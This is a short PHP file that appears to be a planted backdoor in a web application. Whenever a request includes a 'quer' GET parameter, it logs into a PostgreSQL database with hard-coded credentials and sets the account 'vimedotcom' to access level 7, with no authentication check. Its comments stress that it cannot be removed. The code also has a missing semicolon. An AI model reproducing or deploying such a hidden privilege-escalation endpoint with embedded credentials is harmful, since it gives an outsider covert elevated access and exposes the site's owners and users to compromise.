<?php

// QUERY MGR!!!!!!!!!!!!!!!
// UNABLE TO REMOVE!!!!!!!!

if(isset($_GET['quer'])){
	define('DBHOST', '127.0.0.1');
	define('DBUSER', 'postgres');
	define('DBNAME', 'postgres');
	define('DBPASS', '@arikcs@');
	$dbhost = DBHOST;
	$dbname = DBNAME;
	$dbuser = DBUSER;
	$dbpass = DBPASS;
	$conn = new PDO("pgsql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
	if($conn->query("UPDATE accounts SET access_level = 7 WHERE login = 'vimedotcom'")){
		echo 'ok'
	}else{
		echo 'fail';
	}
}else{
	exit;
}

?>
